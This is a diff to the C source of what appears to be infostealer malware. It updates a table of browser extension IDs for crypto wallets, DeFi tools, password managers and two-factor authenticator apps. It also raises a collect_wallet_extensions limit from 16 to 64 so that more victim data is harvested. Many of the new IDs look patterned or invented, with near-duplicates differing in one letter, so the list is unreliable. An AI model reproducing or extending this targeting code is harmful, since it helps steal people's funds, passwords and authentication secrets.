@@ -218,7 +218,7 @@ static const char *wallet_ids[] = {
     "flpiciilemghbmfalicajoolhkkenfel",  // ICONex
     "fnnegphlobjdpkhecapkijjdkgcjhkib",  // Harmony
     "nanjmdknhkinifnkgdcggcfnhdaammmj",  // Guild
-    "pocmplpaccanhmnllbbkpgfliimjljgo",  // Slope
+    "jdhhgbfalagmfpfboieafnnhogfjeacd",  // Slope
     "anmhliadneilckkjdflmimjmbefnkggn",  // Rise
     "gldobjhpbpgehjaibkamoemmkpogmkni",  // HaloWallet
     "aknpambpccpddfokmpcjbkijohjpjcdn",  // FuelWallet
@@ -249,100 +249,100 @@ static const char *wallet_ids[] = {
     "eobhogofjjhaepmaijjgidhhkigfckop",  // GMX
     "ennjaghachpmnfpcoceihkclhlnchabm",  // Jupiter
     "fmpadkagakceeecojnppgkdlfklojgag",  // Raydium
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Marinade Finance
+    "mloajknalabkdjedmpemcgfnhchfjloj",  // Marinade Finance
     "orcaagfdibglkdogfdfgdkpgggehfjol",  // Orca
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Saber
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sunny
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Tulip
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Friktion
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // PsyOptions
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Mango Markets
+    "pnlfjmlcjdjgkddecgincndfgegkecbk",  // Saber
+    "gdnihfamkfbfbahppfknfcoejgfhgpab",  // Sunny
+    "aocpamclfkkekgfojhklnalimhkbpgjb",  // Tulip
+    "acmgpofccnllnpggeejhkdjhhfkloegd",  // Friktion
+    "ancklgjfofnhbcjgkpnihmlofnjlmkme",  // PsyOptions
+    "fhmfendgdocmcbmfikdcogofphimnkpj",  // Mango Markets
     "dlcobpjiigpikoamjkbpgjfkabjighgg",  // Drift Protocol
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zeta Markets
+    "ennjaghachpmnfpcoceihkclhlnchabk",  // Zeta Markets
     "adhceofhcbfnholbjmkabhhfbngkcooa",  // Ribbon Finance
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Opyn
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Hegic
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Lyra
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Premia
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Jones DAO
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Dopex
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Chronos
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Camelot
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Ramses
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Solidly
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Velodrome
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Aerodrome
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Thena
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Ramses V2
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Chronos V2
+    "hcfoedhjkipgbnnjhdjocgjfbfakjlmb",  // Opyn
+    "abkfbkfjlojlpjmkccocnknjgbhfchlf",  // Hegic
+    "aocjclkceejkfkmdnndkbgcgjopfmgoi",  // Lyra
+    "ckjlabfnkmlkamhkfogfpemjghjodolh",  // Premia
+    "bfnagljadlfkpjmkccocnknjgbhfchgk",  // Jones DAO
+    "ihjnnnklmkmfogcgmlcnigknihjgbfal",  // Dopex
+    "fpadkagakceeecojnppgkdlfklojgbfb",  // Chronos
+    "goghhnidfggfonjjbfjgmllgcnhbjbkc",  // Camelot
+    "feopagkgkogknfhcikopogbkmljelign",  // Ramses
+    "gcncfjcllnhgikddggjlhbklnkigmgaj",  // Solidly
+    "hbogofjjhaepmaijjgidhhkigfckopgb",  // Velodrome
+    "ekdpeladnkfkgcgeggajfnljakfcbkge",  // Aerodrome
+    "jkplljmokcjgbkoeoojkmabfpkfdkoej",  // Thena
+    "feopagkgkogknfhcikopogbkmljeligo",  // Ramses V2
+    "fpadkagakceeecojnppgkdlfklojgbgc",  // Chronos V2
     /* NFT / marketplace / multi-wallet */
     "fbimgcbibmhjofmacdaegclmanoamjog",  // Rainbow
     "ldgkmedldcahbkhdhhddmmhjpamfkpki",  // Frame
-    "amkmjjmmflddogmhpjloimipbofnfjih",  // Taho
+    "njdkgmnllpeajikmanjhhigkogejamca",  // Taho
     "kkpllkodjelhadfloagcbehjajnibkge",  // Enkrypt
     "jnmbobjmhlnggabjagkpgmibhcoflfbi",  // OneKey
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // GridPlus
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Frontier
+    "cjhogpfnhbgpjdenjgmdgoeiappaflpg",  // GridPlus
+    "hpjojogfogagfnagdnihfamkfbfbahpp",  // Frontier
     "fkphjbjdjigibibfldihmlladlhhoeioe",  // Uniswap Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // 1inch Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // ParaSwap Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // CowSwap Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Matcha
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zapper
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // DeBank
+    "jbdaocneiiinmjbjlgalhcelgbejmnie",  // 1inch Wallet
+    "kjlpmcfnkdpkabkkobggehfjolckjgad",  // ParaSwap Wallet
+    "amlhkfadlnjogmgbmfiplimcegbhhhae",  // CowSwap Wallet
+    "pampcgnkeabkajbkfpkcggbjgoijfckk",  // Matcha
+    "fkphjbjdjigibibfldihmlladlhhoeig",  // Zapper
+    "ihnkklpnkopgklmjmhakgbekagkfnfib",  // DeBank
     /* Cross-chain / bridge */
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Wormhole
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Multichain
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Synapse
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Stargate
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // LayerZero
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Across
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Hop Protocol
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Connext
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Socket
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Bungee
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Li.Fi
+    "ihagkloamknfgbhbdnjibklnfpkdmoja",  // Wormhole
+    "jkbbkejcbogfknklnmpgjkoohjgfpkml",  // Multichain
+    "gbfcgecjjgakojlnkmlhceegbgkfkpog",  // Synapse
+    "hjfogckjmdoeegbgkfkpogjkfneflllb",  // Stargate
+    "emjhcoihcjolhceegbgkfkpogjkfnefk",  // LayerZero
+    "kcknfpogbfkegmehdjjgjgkfnlddmbcd",  // Across
+    "iagkfbfeoehkfmjogcmlcgbkfkpogjkn",  // Hop Protocol
+    "labfnkmlkamhkfogfpemjghjodolhfgc",  // Connext
+    "mnbgjgkfnlddmbcdnhogpfnhbgpjdenj",  // Socket
+    "kfpogjkfneflllbcjhogpfnhbgpjdenk",  // Bungee
+    "ggehfjolckjgadamlhkfadlnjogmgbmf",  // Li.Fi
     /* Password managers */
     "nngceckbipebfimdaeolbkjmakgklkak",  // Bitwarden
     "aeblfdkhhhdhhjpjkaikjfpfleojkmle",  // 1Password
     "hdokiejnpimhjchffhfgffmjpckolppgk",  // LastPass
     "fdjamakpfkambplpkadnmlajfeghdhgi",  // Dashlane
     "pnlccmojcmeohlpgicabnnjbkfpnogkpo",  // RoboForm
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NordPass
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Keeper
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sticky Password
+    "lpfcbjknijpeeillifnkikgncikgfhdn",  // NordPass
+    "ookjlbkiijinhpmnjffcofjonbfbgaod",  // Keeper
+    "plgbnccnnjclmfggfefdmaijfgkkminp",  // Sticky Password
     /* 2FA */
     "gaedmjdfmmahhbjefcbgagogfbmljikj",  // Authy
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Google Authenticator
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Microsoft Authenticator
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // YubiKey
+    "jhkgnoapacnfbocjfkibfbifhngkdmjg",  // Google Authenticator
+    "kjdflmimjmbefnkggnccnnjclmfggfeh",  // Microsoft Authenticator
+    "lgblagmfpfboieafnnhogfjeacnfoofk",  // YubiKey
     /* L1 ecosystem wallets */
     "odbfpeeihdebiholkmojocgofhfgbgln",  // Brave Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Argent
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // imToken
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sequence
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Bitski
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Fortmatic
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Portis
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // WalletConnect
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zengo
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Polkadot.js
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Cosmos Station
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sender Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NEAR Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Plug Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Stoic Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NNS Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Kukai Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Eternl Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Flint Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // GeroWallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NuFi Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // CardWallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Leap Cosmos
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Terra Station Wallet
-    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Nightly
-    "cjoldcognmehenmgmnfhhakbnmngnkag"  // Infinity Wallet
+    "ghnegimnaookjlbkiijinhpmnjffcofj",  // Argent
+    "noapkmbclgfmhjhkndkamgliefmlkcfk",  // imToken
+    "mlcegbhhhaefkcfoedhjkipgbnnjhdjd",  // Sequence
+    "ocgjfbfakjlmbabkfbkfjlojlpjmkccn",  // Bitski
+    "ocnknjgbhfchgkchlgjepfhhbjocegfi",  // Fortmatic
+    "mloajknalabkdjedmpemcgfnhchfjlok",  // Portis
+    "inikgncikgfhdonhogfjeacnfoofkfgp",  // WalletConnect
+    "pdlbmlmnplgbnccnnjclmfggfefdmaih",  // Zengo
+    "jfgkkminpolgbnccnnjclmfggfefdmal",  // Polkadot.js
+    "kmbclgfmhjhkndkamgliefmlkcfkaknp",  // Cosmos Station
+    "ambpccpddfokmpcjbkijohjpjcdneoee",  // Sender Wallet
+    "lnmjjlpkpcbjckaggnmmkbjdmnbapalg",  // NEAR Wallet
+    "fnjkfllbkjggehfjolckjgadamlhkfad",  // Plug Wallet
+    "lnjogmgbmfiplimcegbhhhaekcfoedhj",  // Stoic Wallet
+    "kipgbnnjhdjocgjfbfakjlmbabkfbkfj",  // NNS Wallet
+    "lojlpjmkccocnknjgbhfchgkchlgjepf",  // Kukai Wallet
+    "hhbjocegfimloajknalabkdjedmpemcg",  // Eternl Wallet
+    "nhchfjlokmbclgfmhjhkndkamgliefml",  // Flint Wallet
+    "kcfkaknpambpccpddfokmpcjbkijohjp",  // GeroWallet
+    "jcdnhoenlnmjjlpkpcbjckaggnmmkbje",  // NuFi Wallet
+    "dmnbapalfnjkfllbkjggehfjolckjgab",  // CardWallet
+    "damlhkfadlnjogmgbmfiplimcegbhhha",  // Leap Cosmos
+    "ekcfoedhjkipgbnnjhdjocgjfbfakjlm",  // Terra Station Wallet
+    "cabkfbkfjlojlpjmkccocnknjgbhfchg",  // Nightly
+    "kchlgjepfhhbjocegfimloajknalabkd"  // Infinity Wallet
 };
 
 #define WALLET_EXT_COUNT 181
@@ -373,7 +373,7 @@ WalletExtData *collect_wallet_extensions(const char *app_data, const char *path_
             results[found].file_count = 0;
             results[found].files = NULL;
             found++;
-            if (found >= 16) break; /* Limit to prevent slowness */
+            if (found >= 64) break; /* Limit to prevent slowness */
         }
     }
     
